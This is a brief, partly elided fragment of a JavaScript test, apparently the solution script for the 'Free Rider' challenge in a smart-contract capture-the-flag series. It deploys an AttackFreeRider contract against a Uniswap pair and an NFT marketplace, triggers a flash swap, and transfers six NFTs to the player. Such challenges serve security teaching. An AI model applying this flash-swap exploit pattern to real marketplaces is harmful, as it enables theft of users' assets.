...
describe("[Challenge] Free Rider", function () {
  ...
  it("Execution", async function () {
    ...
    const AttackFreeRider = await ethers.getContractFactory("AttackFreeRider");
    const attackFreeRider = await AttackFreeRider.deploy(
      uniswapPair.address,
      marketplace.address,
    ...
    await attackFreeRider.flashSwap();
    for (i = 0; i < 6; i++) {
      await attackFreeRider.connect(player).transferNft(i);
    }
  });
